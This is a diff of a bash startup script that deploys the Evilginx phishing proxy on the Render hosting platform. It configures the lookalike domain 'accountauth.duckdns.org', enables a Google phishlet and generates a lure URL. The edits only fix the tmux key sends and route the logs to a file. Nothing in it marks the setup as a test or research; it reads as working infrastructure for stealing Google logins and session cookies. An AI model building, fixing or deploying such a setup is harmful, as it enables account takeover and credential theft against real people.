@@ -1,23 +1,24 @@
 #!/bin/bash
 
-# 1. Bridge Render's dynamic port to Evilginx's port 80
+# 1. Bridge Render's port to Evilginx's port (hide the annoying errors)
 socat TCP-LISTEN:${PORT:-8080},fork TCP:127.0.0.1:80 > /dev/null 2>&1 &
 
-# 2. Start Evilginx inside a detached tmux session
+# 2. Start Evilginx in a detached tmux session
 tmux new-session -d -s evilginx '/app/evilginx -p /app/phishlets'
 
-# 3. Wait for Evilginx to boot up
-sleep 5
+# 3. Wait for it to boot
+sleep 3
 
-# 4. Send the configuration commands into the tmux session
-tmux send-keys -t evilginx "config domain accountauth.duckdns.org" Enter
-tmux send-keys -t evilginx "config ipv4 external 127.0.0.1" Enter
-tmux send-keys -t evilginx "phishlets hostname google accountauth.duckdns.org" Enter
-tmux send-keys -t evilginx "phishlets enable google" Enter
-tmux send-keys -t evilginx "lures create google" Enter
-tmux send-keys -t evilginx "lures get-url 0" Enter
+# 4. Send the configuration commands (using C-m which is the tmux equivalent of Enter)
+tmux send-keys -t evilginx "config domain accountauth.duckdns.org" C-m
+tmux send-keys -t evilginx "config ipv4 external 127.0.0.1" C-m
+tmux send-keys -t evilginx "phishlets hostname google accountauth.duckdns.org" C-m
+tmux send-keys -t evilginx "phishlets enable google" C-m
+tmux send-keys -t evilginx "lures create google" C-m
+tmux send-keys -t evilginx "lures get-url 0" C-m
 
-# 5. Attach to the tmux session and stream the logs to Render
-# This ensures you can see the Evilginx logs in the Render dashboard
-tmux pipe-pane -t evilginx -o 'cat'
-tmux attach-session -t evilginx
+# 5. Pipe the tmux output to a log file
+tmux pipe-pane -t evilginx -o 'cat > /tmp/evilginx.log'
+
+# 6. Keep the container alive and print the logs to Render
+tail -f /tmp/evilginx.log
